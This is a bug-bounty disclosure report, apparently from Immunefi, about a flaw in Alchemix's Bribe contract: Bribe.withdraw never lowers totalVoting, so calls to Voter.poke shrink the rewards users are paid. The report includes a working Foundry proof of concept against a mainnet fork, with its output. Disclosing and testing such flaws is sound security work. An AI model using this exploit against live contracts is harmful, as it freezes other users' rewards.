# 31199 - \[SC - Critical] Users might receive less rewars token after Vot...

Submitted on May 14th 2024 at 20:56:20 UTC by @jasonxiale for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31199

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Permanent freezing of unclaimed yield

## Description

## Brief/Intro

A token owner can call `Voter.poke` to update the voting power, during the `Voter.poke` call, the `Bribe.totalVoting` isn't updated correctly, which results that the `Bribe.earned` will not calculate the rewards correctly.

## Vulnerability Details

While a token owner calls [Voter.poke](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L194-L212), `Voter._reset` is called at the beginning of the [Voter.\_vote](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L413). In `Voter._reset`, `Bribe.withdraw` is called in [Voter.sol#L396](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L396) And `Bribe.withdraw` is defined [as](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L319-L329)

```solidity
319     function withdraw(uint256 amount, uint256 tokenId) external {
320         require(msg.sender == voter);
321 
322         totalSupply -= amount;
323         balanceOf[tokenId] -= amount;
324 
325         _writeCheckpoint(tokenId, balanceOf[tokenId]);
326         _writeSupplyCheckpoint();
327 
328         emit Withdraw(msg.sender, tokenId, amount);
329     }
```

On other side, `Bribe.deposit` is defined [as](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L303-L316)

```solidity
303     function deposit(uint256 amount, uint256 tokenId) external {
304         require(msg.sender == voter);
305 
306         totalSupply += amount;
307         balanceOf[tokenId] += amount;
308 
309         totalVoting += amount;
310 
311         _writeCheckpoint(tokenId, balanceOf[tokenId]);
312         _writeSupplyCheckpoint();
313         _writeVotingCheckpoint();
314 
315         emit Deposit(msg.sender, tokenId, amount);
316     }
```

**As show above, `totalVoting` isn't updated in `Bribe.withdraw`, and the function doesn't call `_writeVotingCheckpoint` to update the checkpoint**.

Then, while calculating the reward in [Bribe.earned](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L221-L280), the function uses `votingCheckpoints.votes` to calculate the rewards in [Bribe.sol#L255-L261](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L255-L261) and [Bribe.sol#L268-L277](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L268-L277)

```solidity
221     function earned(address token, uint256 tokenId) public view returns (uint256) {
...
242         if (_endIndex >= 0) {
243             for (uint256 i = _startIndex; i <= _endIndex; i++) {
...
254                 prevRewards.timestamp = _nextEpochStart;
255                 _prevSupply = votingCheckpoints[getPriorVotingIndex(_nextEpochStart + DURATION)].votes; <<<--- totalVoting is used here
256 
257                 // Prevent divide by zero
258                 if (_prevSupply == 0) {
259                     _prevSupply = 1;
260                 }
261                 prevRewards.balanceOf = (cp0.balanceOf * tokenRewardsPerEpoch[token][_nextEpochStart]) / _prevSupply;
262             }
263         }
...
268         uint256 _priorSupply = votingCheckpoints[getPriorVotingIndex(_lastEpochEnd)].votes; <<<--- totalVoting is used here
...
279         return reward;
280     }
```

So to sum up, during `Voter.poke` call:

1. `Bribe.withdraw` will be called, but within the function `Bribe.totalVoting` isn't deducting `amount`
2. `Bribe.deposit` will be called in [Voter.\_vote](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L441), but this time, `Bribe.totalVoting` is added `amount` So `Voter.poke` function will cause `Bribe.totalVoting` to increase. Then when calculating the rewards amount in `Bribe.earned`, `Bribe.totalVoting` is used, which will result wrong amount of rewards.

## Impact Details

User might receive less reward token after `Voter.poke` is called, and the unclaimed reward token will stuck in the contract.

## References

Add any relevant links to documentation or code

## Proof of Concept

Add the following code to `src/test/Voting.t.sol`, and run

```bash
$ FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/$API --fork-block-number 17133822 --mc VotingTest --mt testAliceBribes -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 2 tests for src/test/Voting.t.sol:VotingTest
[PASS] testAliceBribesNoPoke() (gas: 3532165)
Logs:
  token1 earned aura     :  50000
  token2 earned aura     :  50000

[PASS] testAliceBribesPoke() (gas: 3797647)
Logs:
  token1 earned aura     :  20000
  token2 earned aura     :  20000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 9.93ms (10.25ms CPU time)

```

From the output we can see that

1. in `testAliceBribesNoPoke` Alice doesn't call `Voter.poke`, token1 and token2 will get 50000\*1e18 aura
2. in `testAliceBribesPoke`, Alice calls `Voter.poke` 3 times, token1 and token2 will get 20000\*1e18 aura

```solidity
    function testAliceBribesNoPoke() public {
        address Alice = address(0x11001100);
        address Bob   = address(0x22002200);
        uint256 tokenId1 = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(Bob, TOKEN_1, MAXTIME, false);
        uint256 initialTimestamp = block.timestamp;

        address bribeAddress = voter.bribes(address(sushiGauge));
        uint256 rewardsLength = IBribe(bribeAddress).rewardsListLength();

        // Add BAL bribes to sushiGauge
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](2);
        tokens[0][0] = bal;
        tokens[0][1] = aura;

        hevm.prank(Alice);
        voter.vote(tokenId1, pools, weights, 0);

        hevm.prank(Bob);
        voter.vote(tokenId2, pools, weights, 0);

        // Adding a bribe to a gauge should increase the bribes list length
        // Should be able to add a bribe at any point in an epoch
        hevm.warp(block.timestamp + 6 days);
        createThirdPartyBribe(bribeAddress, aura, TOKEN_100K);

        hevm.warp(block.timestamp + 8 days);
        console2.log("token1 earned aura     : ", IBribe(bribeAddress).earned(aura, tokenId1) / 1e18);
        console2.log("token2 earned aura     : ", IBribe(bribeAddress).earned(aura, tokenId2) / 1e18);
    }
    function testAliceBribesPoke() public {
        address Alice = address(0x11001100);
        address Bob   = address(0x22002200);
        uint256 tokenId1 = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(Bob, TOKEN_1, MAXTIME, false);
        uint256 initialTimestamp = block.timestamp;

        address bribeAddress = voter.bribes(address(sushiGauge));
        uint256 rewardsLength = IBribe(bribeAddress).rewardsListLength();

        // Add BAL bribes to sushiGauge
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](2);
        tokens[0][0] = bal;
        tokens[0][1] = aura;

        hevm.prank(Alice);
        voter.vote(tokenId1, pools, weights, 0);

        hevm.prank(Bob);
        voter.vote(tokenId2, pools, weights, 0);

        hevm.prank(Alice);
        voter.poke(tokenId1);
        hevm.prank(Alice);
        voter.poke(tokenId1);
        hevm.prank(Alice);
        voter.poke(tokenId1);

        // Adding a bribe to a gauge should increase the bribes list length
        // Should be able to add a bribe at any point in an epoch
        hevm.warp(block.timestamp + 6 days);
        createThirdPartyBribe(bribeAddress, aura, TOKEN_100K);

        hevm.warp(block.timestamp + 8 days);
        console2.log("token1 earned aura     : ", IBribe(bribeAddress).earned(aura, tokenId1) / 1e18);
        console2.log("token2 earned aura     : ", IBribe(bribeAddress).earned(aura, tokenId2) / 1e18);
    }
```
